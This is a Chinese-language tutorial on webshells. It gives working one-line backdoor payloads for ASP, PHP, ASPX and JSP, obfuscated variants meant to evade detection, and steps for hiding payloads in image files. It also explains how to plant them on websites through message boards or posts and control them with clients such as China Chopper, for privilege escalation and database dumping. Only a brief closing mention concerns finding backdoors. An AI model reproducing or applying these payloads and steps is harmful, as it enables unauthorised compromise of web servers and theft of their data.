# webshell的种类

一句话木马
小马
大马
打包马
脱裤马
等等

# 一句话木马

介绍： 一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用

<%execute request("value")%>

# 工作原理

黑客在注册信息的电子邮箱或者个人主页等中插入类似如下代码：
<%execute request("value")%>
其中value是值，所以你可以更改自己的值，前面的request就是获取这个值
<%eval request("value")%>(现在比较多见的，而且字符少，对表单字数有限制的地方特别实用)
当知道了数据库的URL，就可以利用本地一张网页进行连接得到Webshell(不知道数据库也可以，只要知道<%eval request("value")%>)这个文件被插入到哪一个ASP文件里面就可以了）

这就被称为一句话木马，它是基于B/S结构的

# 常见写法

asp一句话木马
<%eval rquest("c")%>

php一句话木马
<?php @eval($_POST[value]);?>

aspx一句话木马
<%@ Page Language="Jscript"%>
<%eval(Request.Item["value"])%>

jsp一句话
<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>

# 一句话变形

<?php $_REQUEST['a']($_REQUEST['b']);?>
<%Eval(Request(chr(112)))%>
<%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("xindong"))%>
<%eval""&("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0"&"-"&"2"&"-"&"5"&")"&")")%>
<%a=request("gold")%><%eval a%>

# 一句话图片马的制作

C32下做一句话
打开c32，把图片放里面，写入一句话保存，退出

cmd下做一句话
copy /b 1.jpg+1.asp 2.jpg
win7下右键图片，在属性->详细信息->版权内插入一句话即可

# 常见一句话客户端

一句话最常用的客户端为：
 一句话客户端增强版
 中国菜刀
 中国砍刀
 lanker一句话客户端
 ZV新型PHP一句话木马客户端GUI版

cacls 管理员改文件权限（windows）

# 小马

小马体积小，容易隐藏，隐蔽性强，最重要在于与图片结合一起上传之后可以利用nginx或者IIS6的解析漏洞来运行，不过功能少，一般只有上传等功能

# 大马

大马体积比较大 一般50K以上。功能也多，一般都包括提权命令，磁盘管理，数据库连接接口，执行命令甚至有些以具备自带提权功能和压缩，解压缩网站程序的功能。这种马隐蔽性不好，而大多代码如不加密的话很多杀毒厂商开始追杀此类程序

# 一句话的使用

首先，找到数据库是asp格式的网站，然后，以留言板，或者发表文章的方式，把一句话添加到asp数据库，或者加进asp网页

记住！我们的目的是把一句话<%execute request("value")%>添加到数据库，无论任何方式！

然后打开客户端(就是你电脑上面那个html文件)，填上加入了一句话的asp文件，或者是asp网页，然后进入此网站服务器

# 小马的使用

主要用来上传大马

# 大马的使用

用途：
提权
打包
脱裤
增删文件
等等

# 使用技巧

内容编码
配合解析漏洞
配合文件包含
利用文件名溢出

# 找shell后门

查找后门：
查找webshell后门
找到后门地址
反搞webshell箱子

